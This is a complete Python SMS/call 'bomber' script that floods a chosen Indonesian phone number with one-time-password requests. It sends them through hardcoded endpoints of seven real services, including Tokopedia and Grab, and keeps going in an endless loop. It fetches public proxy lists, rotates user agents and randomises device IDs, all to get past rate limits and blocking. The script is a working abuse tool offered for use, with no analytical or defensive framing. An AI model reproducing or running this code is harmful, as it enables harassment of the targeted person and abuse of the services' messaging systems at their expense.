import asyncio
import aiohttp
import random
import time
import os
import sys

# vULTRA: The "Naked" Bomber (No Bloat, Pure Speed)

# 1. HARDCODED TARGETS (The "Magnificent Seven")
APIS = [
    {"name": "KlikDokter-WA", "url": "https://auth.klikdokter.com/api/v1/otp", "method": "POST", "json": {"phone": "{c}", "channel": "wa"}},
    {"name": "Nutriclub-SMS", "url": "https://membership.nutriclub.co.id/api/otp/send", "method": "POST", "json": {"phone": "{c}", "action": "registration"}},
    {"name": "PHD-SMS", "url": "https://phd.co.id/en/users/sendOTP", "method": "POST", "data": {"phone_number": "{c}"}},
    {"name": "Eraspace-SMS", "url": "https://api.eraspace.com/customer/v1/otp", "method": "POST", "json": {"phone": "{c}", "otpType": "REGISTER"}},
    {"name": "Marugame-SMS", "url": "https://api.marugame.co.id/api/v1/auth/otp", "method": "POST", "json": {"phoneNumber": "{phone}"}},
    {"name": "Tokopedia-Call", "url": "https://accounts.tokopedia.com/otp/c/page/request-otp-v2", "method": "POST", "headers": {"X-Device-ID": "{semirandom}"}, "data": {"msisdn": "{c}", "otp_type": "112", "mode": "call"}},
    {"name": "Grab-Call", "url": "https://api.grab.com/grabid/v1/phone/otp", "method": "POST", "headers": {"X-Grab-Device-ID": "{semirandom}"}, "data": {"phoneNumber": "{phone}", "countryCode": "ID", "method": "CALL"}}
]

# 2. MINI UTILS
def process(data, number):
    # Formats: 08xx, 628xx
    c_fmt = "62" + number[1:] if number.startswith("0") else number
    s_random = "".join(random.choices("0123456789abcdef", k=16))
    
    if isinstance(data, dict):
        return {k: v.replace("{c}", c_fmt).replace("{phone}", number).replace("{semirandom}", s_random) for k, v in data.items()}
    return data

def get_headers():
    # Rotates simple User-Agents
    uas = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    ]
    return {
        "User-Agent": random.choice(uas),
        "Content-Type": "application/json",
        "Accept": "*/*"
    }

# 3. PROXY ENGINE
async def get_proxies():
    print("⚡ [ULTRA] Fetching Fresh Proxies...")
    urls = [
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt"
    ]
    proxies = []
    async with aiohttp.ClientSession() as session:
        for u in urls:
            try:
                async with session.get(u, timeout=5) as resp:
                    text = await resp.text()
                    proxies.extend(text.splitlines())
            except: pass
    
    valid = [p.strip() for p in proxies if ":" in p]
    print(f"⚡ [ULTRA] Loaded {len(valid)} Raw Proxies")
    return valid

# 4. ATTACK ENGINE
async def attack(number):
    proxies = await get_proxies()
    if not proxies: proxies = [None] # Direct fallback
    
    print(f"🚀 [ULTRA] BOMBING {number} WITH MAXIMUM POWER")
    print("Press Ctrl+C to Stop")
    
    async with aiohttp.ClientSession() as session:
        while True:
            tasks = []
            # Batch of 50
            for _ in range(50):
                api = random.choice(APIS)
                proxy = "http://" + random.choice(proxies) if proxies[0] else None
                tasks.append(fire(session, api, number, proxy))
            
            await asyncio.gather(*tasks)
            await asyncio.sleep(0.5) # Slight breathing room

async def fire(session, api, number, proxy):
    try:
        url = api["url"]
        method = api["method"]
        headers = get_headers()
        api_headers = api.get("headers", {})
        # Replace placeholders in headers
        final_headers = headers.copy()
        for k, v in api_headers.items():
            final_headers[k] = v.replace("{semirandom}", "".join(random.choices("0123456789abcdef", k=16)))
            
        data = process(api.get("json"), number)
        form_data = process(api.get("data"), number)
        
        args = {
            "method": method,
            "url": url,
            "headers": final_headers,
            "proxy": proxy,
            "timeout": 5
        }
        if data: args["json"] = data
        if form_data: args["data"] = form_data
        
        async with session.request(**args) as resp:
            if resp.status in [200, 201]:
                print(f"✅ {api['name']} -> SENT")
            elif resp.status == 429:
                print(f"🚫 {api['name']} -> RATE LIMIT")
            else:
                # print(f"❌ {api['name']} -> {resp.status}") # Optional noise
                pass
    except:
        pass

if __name__ == "__main__":
    if len(sys.argv) < 2:
        num = input("🎯 Target Number (08xx): ")
    else:
        num = sys.argv[1]
        
    try:
        asyncio.run(attack(num))
    except KeyboardInterrupt:
        print("\n🛑 Stopped.")
